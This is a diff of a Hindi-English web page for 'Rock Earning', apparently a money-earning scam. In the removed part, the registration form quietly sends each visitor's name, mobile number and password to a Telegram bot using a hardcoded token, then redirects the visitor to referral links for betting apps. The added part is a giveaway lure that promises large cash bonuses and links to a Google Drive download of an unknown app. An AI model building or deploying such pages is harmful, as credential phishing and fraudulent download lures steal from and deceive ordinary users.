@@ -3,209 +3,154 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rock Earning - Register</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@700;800&family=Montserrat:wght@400;600&display=swap" rel="stylesheet">
+    <title>Rock Earning - Mega Giveaway & Download</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@700;900&display=swap" rel="stylesheet">
     <style>
-        /* --- General Settings --- */
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
-        
-        /* Registration Section Styling */
-        #register-section {
-            background: linear-gradient(135deg, #2c3e50 0%, #000000 100%);
-            min-height: 100vh;
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: radial-gradient(circle, #1e3c72 0%, #2a5298 40%, #f3c623 100%);
+            background-attachment: fixed;
+            margin: 0;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            min-height: 100vh;
+            color: #fff;
         }
 
-        .register-container {
-            background: #ffffff;
+        .main-card {
+            background: rgba(255, 255, 255, 0.95);
+            width: 90%;
+            max-width: 450px;
+            border-radius: 30px;
             padding: 30px;
-            border-radius: 20px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
-            width: 100%;
-            max-width: 420px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            text-align: center;
+            border: 5px solid #fff;
         }
 
-        .app-logo {
-            font-family: 'Poppins', sans-serif;
+        .logo-img {
+            width: 140px;
+            height: 140px;
+            filter: drop-shadow(0 5px 15px rgba(0,0,0,0.2));
+            margin-bottom: 10px;
+        }
+
+        .app-title {
             font-size: 42px;
-            font-weight: 800;
-            text-align: center;
-            margin-bottom: 5px;
-            background: linear-gradient(to right, #f1c40f, #e67e22);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+            font-weight: 900;
+            color: #1e3c72;
+            text-transform: uppercase;
+            margin: 10px 0;
+            letter-spacing: -1px;
+            line-height: 1;
         }
 
-        .register-container h2 { text-align: center; color: #333; margin-bottom: 8px; font-size: 20px; }
-        
-        .bonus-badge {
-            background: #fff8e1;
-            color: #c0392b;
-            text-align: center;
+        .tagline {
+            background: #f3c623;
+            color: #000;
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 10px;
+            font-weight: 900;
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        .promo-box {
+            background: #fdf2d0;
+            border: 3px dashed #e67e22;
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        .giveaway-alert {
+            background: #e74c3c;
+            color: white;
             padding: 10px;
             border-radius: 10px;
-            font-size: 13px;
-            margin-bottom: 20px;
-            font-weight: bold;
-            border: 2px dashed #f1c40f;
-        }
-
-        .input-group { margin-bottom: 15px; }
-        .input-group label { display: block; margin-bottom: 7px; color: #444; font-weight: 600; font-size: 14px; }
-        .input-group input {
-            width: 100%;
-            padding: 14px;
-            border: 1px solid #ddd;
-            border-radius: 10px;
-            outline: none;
-            background-color: #f9f9f9;
-        }
-
-        .btn-register {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(to right, #f1c40f, #e67e22);
-            border: none;
-            border-radius: 10px;
-            color: white;
-            font-size: 17px;
-            font-weight: bold;
-            cursor: pointer;
-            box-shadow: 0 5px 15px rgba(230, 126, 34, 0.3);
-        }
-
-        /* Campion Page (Hidden Initially) */
-        #campion-section {
-            display: none;
-            background: linear-gradient(135deg, #5f6dfc, #6a11cb);
-            color: white;
+            font-weight: 900;
+            font-size: 20px;
             text-align: center;
-            min-height: 100vh;
-            padding: 15px;
+            margin-bottom: 15px;
+            animation: blink 1s infinite;
         }
 
-        .campion-h1 {
-            font-size: 30px;
-            background: linear-gradient(to right, orange, lime);
-            -webkit-background-clip: text;
-            color: transparent;
+        @keyframes blink {
+            50% { opacity: 0.7; transform: scale(1.02); }
+        }
+
+        .offer-item {
+            color: #2c3e50;
+            font-size: 18px;
+            font-weight: 800;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+        }
+
+        .offer-item span {
+            margin-right: 10px;
+            font-size: 22px;
+        }
+
+        .btn-green {
+            display: block;
+            background: linear-gradient(135deg, #2ecc71 0%, #27ae60 100%);
+            color: white;
+            text-decoration: none;
+            font-size: 26px;
+            font-weight: 900;
+            padding: 20px;
+            border-radius: 50px;
+            box-shadow: 0 10px 30px rgba(46, 204, 113, 0.5);
+            border: 4px solid #fff;
+            transition: 0.3s;
+            text-transform: uppercase;
+        }
+
+        .btn-green:hover {
+            transform: scale(1.05);
+            box-shadow: 0 15px 40px rgba(46, 204, 113, 0.7);
+            background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%);
+        }
+
+        .footer-info {
             margin-top: 20px;
+            color: #7f8c8d;
+            font-weight: 700;
+            font-size: 14px;
         }
-
-        .card { background: #ffffff; color: #000; border-radius: 20px; padding: 20px; margin: 15px; }
-        .app-icon { width: 70px; height: 70px; border-radius: 20px; margin: auto; display: flex; align-items: center; justify-content: center; font-weight: bold; color: white; font-size: 22px; }
-        .w03 {background: linear-gradient(45deg, red, orange);}
-        .ant {background: linear-gradient(45deg, #00c6ff, #0072ff);}
-        .tf {background: linear-gradient(45deg, purple, pink);}
-        .step { background: #ddd; margin: 8px 0; padding: 10px; border-radius: 10px; font-weight: bold; }
-        .btn-link { display: block; margin: 12px auto; padding: 14px; border-radius: 30px; width: 90%; text-decoration: none; font-weight: bold; }
-        .btn-orange { background: linear-gradient(to right, orange, orangered); color: black; }
-        .btn-blue { background: #167db7; color: white; }
-        
-        footer { margin-top: 20px; padding: 10px; background: black; color: yellow; }
     </style>
 </head>
 <body>
 
-<div id="register-section">
-    <div class="register-container">
-        <div class="app-logo">Rock Earning</div>
-        <h2>Naya Account Banayein</h2>
-        <div class="bonus-badge">🔥 Welcome Bonus: Sign up par ₹50!</div>
+    <div class="main-card">
+        <img src="https://cdn-icons-png.flaticon.com/512/2489/2489756.png" alt="Logo" class="logo-img">
 
-        <form id="registerForm">
-            <div class="input-group">
-                <label>Poora Naam</label>
-                <input type="text" id="name" placeholder="Apna naam daalein" required>
-            </div>
-            <div class="input-group">
-                <label>Mobile Number</label>
-                <input type="tel" id="mobile" placeholder="10 digit number" required>
-            </div>
-            <div class="input-group">
-                <label>Password</label>
-                <input type="password" id="password" placeholder="Strong password" required>
-            </div>
-            <button type="submit" class="btn-register" id="submitBtn">Register Karein</button>
-        </form>
+        <h1 class="app-title">ROCK EARNING</h1>
+        <div class="tagline">LUUTO MAAL! 💰</div>
+
+        <div class="promo-box">
+            <div class="giveaway-alert">🎁 ₹10,000 MEGA GIVEAWAY!</div>
+            
+            <div class="offer-item"><span>🤑</span> DOWNLOAD BONUS: <b>₹100 FREE</b></div>
+            <div class="offer-item"><span>🚀</span> PER REFER: <b>₹50 INSTANT</b></div>
+            <div class="offer-item"><span>💎</span> DAILY SPIN: <b>WIN UP TO ₹500</b></div>
+            <div class="offer-item"><span>🔥</span> 100% SECURE WITHDRAWAL</div>
+        </div>
+
+        <!-- UPDATED DOWNLOAD BUTTON -->
+        <a href="https://drive.google.com/uc?export=download&id=1f3lh_uxe7xd2B52fqVIzOWjbO8GPaCHV" class="btn-green">
+            📥 DOWNLOAD NOW
+        </a>
+
+        <div class="footer-info">
+            V 2.0 | FASTEST EARNING APP | 100% TRUSTED
+        </div>
     </div>
-</div>
-
-<div id="campion-section">
-    <h1 class="campion-h1">Rock Earning Campion</h1>
-    <p>App ka payment lene ke liye Click link Register and app download</p>
-
-    <div class="card">
-        <div class="app-icon w03">W03</div>
-        <h2>🔥 Win03 App</h2>
-        <div class="step">👉 Register & Download</div>
-        <div class="step">💰 First Withdraw</div>
-        <a href="https://win03.club/login?mode=register&i=T8LmIY12" class="btn-link btn-orange">Register</a>
-        <a href="https://t.me/m_r_Rav" class="btn-link btn-blue">Send Screenshot</a>
-    </div>
-
-    <div class="card">
-        <div class="app-icon ant">ANT</div>
-        <h2>🚀 Anthena App</h2>
-        <div class="step">📝 Complete Signup</div>
-        <a href="https://www.gathn.com/registerDesc?code=_6Hdt9P5DGNP" class="btn-link btn-orange">Register</a>
-        <a href="https://t.me/m_r_Rav" class="btn-link btn-blue">Send Screenshot</a>
-    </div>
-
-    <div style="margin: 20px;">
-        <h2>Join Telegram: @m_r_Rav</h2>
-    </div>
-
-    <footer>© 2026 Rock Earning Campion</footer>
-</div>
-
-<script>
-    const form = document.getElementById('registerForm');
-    
-    form.addEventListener('submit', function(e) {
-        e.preventDefault();
-        const submitBtn = document.getElementById('submitBtn');
-        submitBtn.innerText = "Verifying...";
-        submitBtn.disabled = true;
-
-        // Aapki Verified Details
-        const token = "8656244880:AAHGBx-s4Mc8nuIgoi8DtiqPL99_KUaVncg";
-        const chat_id = "8682457838"; 
-        
-        const name = document.getElementById('name').value;
-        const mobile = document.getElementById('mobile').value;
-        const password = document.getElementById('password').value;
-
-        const message = `🚀 *New Registration* 🚀\n\n👤 Name: ${name}\n📱 Mobile: ${mobile}\n🔑 Password: ${password}`;
-
-        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-
-        fetch(url)
-        .then(response => response.json())
-        .then(data => {
-            if(data.ok) {
-                alert("Abhinandan! Registration safal raha.");
-                // Registration chupao aur Campion page dikhao
-                document.getElementById('register-section').style.display = 'none';
-                document.getElementById('campion-section').style.display = 'block';
-                window.scrollTo(0,0);
-            } else {
-                alert("Error: " + data.description);
-            }
-        })
-        .catch(err => {
-            alert("Internet issue! Phir se try karein.");
-        })
-        .finally(() => {
-            submitBtn.innerText = "Register Karein";
-            submitBtn.disabled = false;
-        });
-    });
-</script>
 
 </body>
 </html>
